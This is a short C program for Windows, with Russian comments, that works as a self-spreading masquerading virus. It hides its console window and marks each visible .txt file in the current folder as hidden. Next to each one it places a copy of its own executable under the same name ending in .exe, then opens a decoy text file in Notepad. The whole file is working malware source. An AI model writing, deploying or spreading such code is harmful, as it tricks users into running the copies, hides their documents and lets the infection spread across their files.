#include <fileapi.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <fileapi.h>

int main(int argc, char* argv[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
    char *pch, *pch1;
	char myName[MAX_PATH];
	char mytxt[MAX_PATH];
	char path[MAX_PATH];
	char clearPath[MAX_PATH];
	//выясняем свое имя
	strcpy (myName, argv[0]);
	
	//выясняем имя своего txt
	// printf("my name: %s", myName);
	
	char *isStr = strtok (myName, ".");
	if (isStr != NULL)
	{
		if (strcpy (mytxt, isStr))
		{
			if (strcat (mytxt, ".txt"))
			{
				// printf("found my txt: %s\n", mytxt);
			}
			else
			{
				// printf("strcat error");
				return 5;
			}
		}
		else
		{
			// printf("strcpy error");
			return 4;
		}
			
	}
	else
	{
		// printf("strtok error");
		return 3;
	}
	// printf ("Start hacking\n");
	
	// выясняем текущую директорию
	if (GetCurrentDirectory (sizeof (path), path))
    {
        // printf ("found path:%s\n", path);
		strcpy (clearPath, path);
        lstrcat (clearPath, "\\");
        lstrcat (path, "\\*.txt");
        // printf ("edited path:%s\n", path);
    }
	else
	{
        // printf ("error while recieving path %s\n", GetLastError ());
		return 1;
	}
		
	hFind = FindFirstFile(path, &FindFileData);
	
	if (hFind == INVALID_HANDLE_VALUE)
    {
		// printf ("Invalid file handle. Error is %u.\n", GetLastError ());
		return 2;
	}
	if (strstr (FindFileData.cFileName, mytxt))
	{
		// printf ("my txt | ");
	}
	if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
	{
		// printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
	}
	else
	{
		char tmpExeName[MAX_PATH];
		// printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
		SetFileAttributes (FindFileData.cFileName, FILE_ATTRIBUTE_HIDDEN);
		isStr = strtok (FindFileData.cFileName, ".");
		strcpy (tmpExeName, isStr);
		strcat (tmpExeName, ".exe");
				
		int res = CopyFile (argv[0], tmpExeName, false);
		if (res == 0)
		{
			// printf ("error while make copy: %d\n", GetLastError ());
			return 6;
		}
	}
	while (FindNextFile(hFind, &FindFileData) != 0)
	{
		
		if (strstr (FindFileData.cFileName, mytxt))
		{
			// printf ("my txt | ");
		}
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
		{
			// printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
		}
		else
		{
			char tmpExeName[MAX_PATH];
			// printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
			SetFileAttributes (FindFileData.cFileName, FILE_ATTRIBUTE_HIDDEN);
			isStr = strtok (FindFileData.cFileName, ".");
			strcpy (tmpExeName, isStr);
			strcat (tmpExeName, ".exe");
					
			int res = CopyFile (argv[0], tmpExeName, false);
			if (res == 0)
			{
				// printf ("error while make copy: %d\n", GetLastError ());
				return 6;
			}
		}
	}
	
	FindClose(hFind);
	char command[MAX_PATH] = "notepad ";
	//printf ("%s\n", mytxt);
	strcat (command, mytxt);
	system (command);
	return 0;
}